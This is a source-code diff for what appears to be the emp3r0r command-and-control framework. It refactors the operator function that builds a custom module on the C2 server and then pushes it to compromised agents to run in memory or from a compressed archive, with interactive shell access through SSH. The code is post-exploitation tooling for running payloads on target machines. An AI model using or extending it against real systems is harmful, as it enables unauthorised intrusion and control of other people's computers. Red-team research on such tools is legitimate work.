@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -27,34 +28,62 @@ var ModuleNames = make(map[string]string)
 
 // moduleCustom run a custom module
 func moduleCustom() {
-	go func() {
-		config, exists := ModuleConfigs[CurrentMod]
-		if !exists {
-			CliPrintError("Config of %s does not exist", CurrentMod)
-			return
-		}
+	config, exists := ModuleConfigs[CurrentMod]
+	if !exists {
+		CliPrintError("Config of %s does not exist", CurrentMod)
+		return
+	}
 
-		updateModuleOptions(&config)
+	updateModuleOptions(&config)
 
-		download_addr := getDownloadAddr()
+	// build module on C2
+	err := build_module(&config)
+	if err != nil {
+		CliPrintError("Build module %s: %v", config.Name, err)
+		return
+	}
 
-		payload_type, exec_cmd, envStr, err := genModStartCmd(&config)
+	// if module is a plugin, no need to upload and execute files on target
+	if config.IsPlugin {
+		CliPrint("%s will run as a plugin on C2, no files will be executed on target", config.Name)
+		return
+	}
+
+	// where to download the module, can be from C2 or other agents, see `listener`
+	download_addr := getDownloadAddr()
+
+	// agent side configs
+	payload_type, exec_cmd, envStr, err := genModStartCmd(&config)
+	if err != nil {
+		CliPrintError("Parsing module config: %v", err)
+		return
+	}
+
+	// instead of capturing the output of the command, we use ssh to access the interactive shell provided by the module
+	if config.AgentConfig.IsInteractive {
+		exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
+	}
+
+	if config.AgentConfig.InMemory {
+		handleInMemoryModule(config, payload_type, download_addr)
+		return
+	}
+
+	handleCompressedModule(config, payload_type, exec_cmd, envStr, download_addr)
+}
+
+func build_module(config *emp3r0r_def.ModuleConfig) error {
+	// build module
+	if config.Build != "" {
+		CliPrintInfo("Building %s...", config.Name)
+		out, err := exec.Command("sh", "-c", config.Build).Output()
 		if err != nil {
-			CliPrintError("Parsing module config: %v", err)
-			return
+			err = fmt.Errorf("building %s: %s (%v)", config.Name, out, err)
+			return err
 		}
+	}
 
-		if config.AgentConfig.IsInteractive {
-			exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
-		}
-
-		if config.AgentConfig.InMemory {
-			handleInMemoryModule(config, payload_type, download_addr)
-			return
-		}
-
-		handleCompressedModule(config, payload_type, exec_cmd, envStr, download_addr)
-	}()
+	return nil
 }
 
 func updateModuleOptions(config *emp3r0r_def.ModuleConfig) {
